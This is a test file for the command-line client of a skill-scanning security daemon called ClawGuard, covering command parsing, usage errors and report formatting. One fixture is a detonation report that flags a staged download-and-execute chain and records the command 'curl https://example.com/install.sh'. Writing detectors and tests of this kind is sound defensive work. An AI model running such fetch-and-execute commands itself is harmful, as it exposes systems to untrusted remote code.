import assert from "node:assert/strict";
import { test } from "node:test";

import {
  buildCommand,
  buildForegroundDaemonLaunchCommand,
  buildPayload,
  formatConnectionError,
  formatSuccess,
} from "./index.js";

test("buildPayload parses static-path commands", () => {
  assert.deepEqual(buildPayload("status", []), { command: "status" });
  assert.deepEqual(buildPayload("audit", []), { command: "audit" });
  assert.deepEqual(buildPayload("scan", ["/tmp/skill"]), {
    command: "scan",
    skillPath: "/tmp/skill",
  });
  assert.deepEqual(buildPayload("report", ["calendar-helper"]), {
    command: "report",
    slug: "calendar-helper",
  });
  assert.deepEqual(buildPayload("allow", ["calendar-helper", "manual", "review"]), {
    command: "allow",
    slug: "calendar-helper",
    reason: "manual review",
  });
  assert.deepEqual(buildPayload("block", ["calendar-helper"]), {
    command: "block",
    slug: "calendar-helper",
  });
  assert.deepEqual(buildPayload("detonate", ["calendar-helper"]), {
    command: "detonate",
    slug: "calendar-helper",
  });
});

test("buildCommand parses direct service-management commands", () => {
  assert.deepEqual(buildCommand("daemon", []), {
    kind: "daemon-process",
  });
  assert.deepEqual(buildCommand("service", ["install"]), {
    kind: "service",
    action: "install",
  });
  assert.deepEqual(buildCommand("service", ["status"]), {
    kind: "service",
    action: "status",
  });
  assert.deepEqual(buildCommand("service", ["uninstall"]), {
    kind: "service",
    action: "uninstall",
  });
});

test("buildPayload throws actionable usage errors", () => {
  assert.throws(() => buildPayload("scan", []), /Usage: clawguard scan <skill-path>/);
  assert.throws(() => buildPayload("report", []), /Usage: clawguard report <slug>/);
  assert.throws(() => buildPayload("allow", []), /Usage: clawguard allow <slug> \[reason\]/);
  assert.throws(() => buildPayload("block", []), /Usage: clawguard block <slug> \[reason\]/);
  assert.throws(() => buildPayload("detonate", []), /Usage: clawguard detonate <slug>/);
  assert.throws(() => buildPayload("unknown", []), /Unknown command: unknown/);
  assert.throws(
    () => buildCommand("service", []),
    /Usage: clawguard service <install\|status\|uninstall>/,
  );
});

test("formatSuccess tolerates legacy status payloads without watcher fields", () => {
  assert.equal(
    formatSuccess(
      { command: "status" },
      {
        state: "idle",
        jobs: 0,
      },
      false,
    ),
    ["ClawGuard daemon status", "- State: idle", "- Active jobs: 0"].join("\n"),
  );
});

test("formatConnectionError points operators at the install-safe daemon command", () => {
  const error = new Error("missing socket") as NodeJS.ErrnoException;
  error.code = "ENOENT";

  assert.match(formatConnectionError(error), /Start the daemon first: clawguard daemon/u);
});

test("formatSuccess renders detonation reports", () => {
  const output = formatSuccess(
    { command: "detonate", slug: "calendar-helper" },
    {
      report: {
        request: {
          requestId: "det-001",
          snapshot: {
            slug: "calendar-helper",
            path: "/tmp/calendar-helper",
            sourceHints: [],
            contentHash: "sha256:test",
            fileInventory: ["SKILL.md"],
            detectedAt: "2026-03-19T00:00:00.000Z",
          },
          prompts: ["run"],
          timeoutSeconds: 90,
        },
        summary: "Behavioral detonation observed a staged download-and-execute chain.",
        findings: [
          {
            ruleId: "CG-DET-STAGED-DOWNLOAD-EXECUTE",
            severity: "critical",
            message: "Behavioral detonation observed a staged download-and-execute chain.",
            evidence: ["Executed /usr/bin/curl https://example.com/install.sh"],
          },
        ],
        score: 90,
        recommendation: "block",
        triggeredActions: ["/usr/bin/curl https://example.com/install.sh"],
        artifacts: [],
        generatedAt: "2026-03-19T00:00:01.000Z",
      },
    },
    false,
  );

  assert.match(output, /Detonation completed for calendar-helper/u);
  assert.match(output, /Recommendation: block/u);
});

test("foreground daemon launch preserves the caller cwd", () => {
  const launch = buildForegroundDaemonLaunchCommand();

  assert.equal(launch.workingDirectory, process.cwd());
});
